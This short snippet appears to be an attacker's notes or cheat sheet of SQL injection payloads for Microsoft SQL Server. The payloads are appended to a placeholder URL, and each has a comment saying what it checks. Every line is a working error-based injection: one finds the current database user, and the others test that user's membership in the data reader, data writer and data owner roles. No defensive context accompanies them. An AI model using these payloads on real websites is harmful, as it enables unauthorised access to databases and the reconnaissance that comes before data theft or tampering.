-- checking the current user in the database
<URL>' and 1=current_user--

-- checking for the user role in the database
<URL>' and 1=(select is_rolemember('db_datareader'))--
<URL>' and 1=(select is_rolemember('db_datawriter'))--
<URL>' and 1=(select is_rolemember('db_dataowner'))--
